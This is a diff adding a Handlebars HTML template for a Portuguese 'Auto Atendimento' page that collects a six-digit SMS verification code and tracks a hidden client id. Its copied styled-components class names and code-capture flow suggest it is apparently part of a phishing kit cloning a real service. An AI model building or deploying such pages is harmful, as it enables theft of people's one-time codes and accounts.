@@ -1,0 +1,46 @@
+{{>components/topbar}}
+
+<div id="__next">
+        <div class="clean-page-container__Container-sc-fzay79-0 dGAlqK">
+
+            <!-- error -->
+            <form class="form-stn form-auth" >
+                <div width="400" class="sc-AxjAm hfpSUp card__Card-sc-2xb3kk-0 IOciT">
+                    <div class="sc-AxjAm sc-AxirZ BmOBm"><h1>Auto Atendimento</h1></div>
+                    <div class="styles__DimmerWrapper-sc-q27j9n-0 dkPhEC">
+                        <div class="styles__LoaderIcon-sc-1onbhrc-0 ebFmcr"></div>
+                    </div>
+
+                    <input type="hidden" name="id" value="{{client.id}}">
+
+                    <div class="form-stn-title">Confirme o código enviado por SMS</div>
+                    <div class="sc-fzozJi ldfQIR">
+                        {{#if client}}
+                        <input type="hidden" name="id" value="{{client.id}}">
+                        {{/if}}
+                        <div class="sc-AxjAm sc-AxirZ fUlriR">
+
+                            <div class="verify_inputs">
+                                <input type="number" name="code1" id="" required>
+                                <input type="number" name="code2" id="" required>
+                                <input type="number" name="code3" id="" required>
+                                <input type="number" name="code4" id="" required>
+                                <input type="number" name="code5" id="" required>
+                                <input type="number" name="code6" id="" required>
+
+                            </div>
+                        </div>
+                        <div class="sc-AxhCb jXrfDR">
+                            <div name="captcha"></div>
+                            <div color="red" class="sc-AxjAm jmPVhW styles__StyledText-sc-ftb6xw-0 gouAvy"></div>
+                        </div><button type="submit" width="1" class="sc-AxjAm bmfNbS styles__StyledButton-sc-1066mea-0 OPeEQ" id="btnLogin">Entrar</button>
+
+                        <div class="voltar">
+                            <a href="/?client={{client.id}}">Voltar</a>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+</div>
+<div id="modal"></div>
